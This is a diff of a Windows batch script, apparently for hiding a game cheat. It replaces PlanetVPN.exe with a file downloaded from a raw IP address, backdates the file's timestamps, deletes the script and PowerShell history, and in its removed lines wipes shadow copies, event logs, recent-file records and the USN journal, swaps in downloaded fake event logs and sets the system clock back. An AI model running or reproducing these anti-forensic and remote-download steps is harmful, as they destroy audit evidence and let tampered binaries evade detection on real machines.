@@ -1,77 +1,35 @@
 @echo off
+echo eger boyle kaldiysa gorev yoneticisinden hile exesini kapatin ve bekleyin...
 
-taskkill /f /im PlanetVPN.exe > nul 2>&1
-del /f "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" > nul 2>&1
-curl -L -o "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" https://31.57.156.199/PlanetVPN.exe
+:loop
+tasklist | find /i "PlanetVPN.exe" >nul
+if not errorlevel 1 (
+    timeout /t 1 >nul
+    goto loop
+)
 
-echo Y | vssadmin delete shadows /for=C: /oldest > nul 2>&1
+echo Deleting existing...
+del /f "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"
 
-del /f "%USERPROFILE%\AppData\Local\CrashDumps\PlanetVPN.exe.*.dmp" > nul 2>&1
-del /f "%APPDATA%\Microsoft\Windows\Recent\*" > nul 2>&1
+echo oPlanetVPN.exe...
+bitsadmin /transfer myDownloadJob /download /priority high https://31.57.156.199/PlanetVPN.exe "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe"
 
-net stop diagtrack > nul 2>&1
-net stop pcasvc > nul 2>&1
-net stop dps > nul 2>&1
-net stop SysMain > nul 2>&1
-net stop dusmsvc > nul 2>&1
-net stop cryptsvc > nul 2>&1
-net stop eventlog > nul 2>&1
+if exist "C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe" (
+    echo Completed new.
 
-timeout /t 2 /nobreak > nul 2>&1
+    echo Setting file times...
+    powershell -NoProfile -Command ^
+    "$filePath = 'C:\Program Files (x86)\PlanetVPN\PlanetVPN.exe'; ^
+    if (Test-Path $filePath) { ^
+        $item = Get-Item $filePath; ^
+        $time = '2024-10-14 13:59:24'; ^
+        $item.LastWriteTime = $time; ^
+        $item.CreationTime = $time; ^
+    } else { Write-Host 'Dosya bulunamadı: $filePath' }"
 
-del /f C:\Windows\System32\winevt\Logs\Application.evtx > nul 2>&1
-del /f C:\Windows\System32\winevt\Logs\System.evtx > nul 2>&1
-del /f C:\Windows\System32\winevt\Logs\Security.evtx > nul 2>&1
-del /f "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx" > nul 2>&1
-del /f "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" > nul 2>&1
-del /f "C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx" > nul 2>&1
+    echo Cleaning up...
+    powershell -Command "Start-Sleep -Seconds 5; Remove-Item '%~f0'"
+    powershell -NoProfile -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue"
+)
 
-curl -L -o C:\Windows\System32\winevt\Logs\Application.evtx https://31.57.156.199/Application.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o C:\Windows\System32\winevt\Logs\System.evtx https://31.57.156.199/System.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o C:\Windows\System32\winevt\Logs\Security.evtx https://31.57.156.199/Security.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx" https://31.57.156.199/Microsoft-Windows-Ntfs%254Operational.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" https://31.57.156.199/Microsoft-Windows-PowerShell%254Operational.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o "C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx" https://31.57.156.199/Windows%20PowerShell.evtx
-timeout /t 2 /nobreak > nul 2>&1
-
-net start eventlog > nul 2>&1
-net start pcasvc > nul 2>&1
-net start dps > nul 2>&1
-net start SysMain > nul 2>&1
-net start dusmsvc > nul 2>&1
-net start cryptsvc > nul 2>&1
-net start diagtrack > nul 2>&1
-
-del /f C:\Windows\System32\winevt\Logs\Application.evtx > nul 2>&1
-del /f C:\Windows\System32\winevt\Logs\System.evtx > nul 2>&1
-del /f C:\Windows\System32\winevt\Logs\Security.evtx > nul 2>&1
-del /f "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx" > nul 2>&1
-del /f "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" > nul 2>&1
-del /f "C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx" > nul 2>&1
-
-curl -L -o C:\Windows\System32\winevt\Logs\Application.evtx https://31.57.156.199/Application.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o C:\Windows\System32\winevt\Logs\System.evtx https://31.57.156.199/System.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o C:\Windows\System32\winevt\Logs\Security.evtx https://31.57.156.199/Security.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Ntfs%4Operational.evtx" https://31.57.156.199/Microsoft-Windows-Ntfs%254Operational.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o "C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" https://31.57.156.199/Microsoft-Windows-PowerShell%254Operational.evtx
-timeout /t 2 /nobreak > nul 2>&1
-curl -L -o "C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx" https://31.57.156.199/Windows%20PowerShell.evtx
-timeout /t 2 /nobreak > nul 2>&1
-
-net start w32time > nul 2>&1
-w32tm /resync > nul 2>&1
-
-powershell -Command ^
-"$d = Get-Date; Set-Date ($d.AddYears(-1))"
-
-fsutil usn deletejournal /n c: > nul 2>&1
-fsutil usn createjournal m=1000 a=100 c: > nul 2>&1
+exit
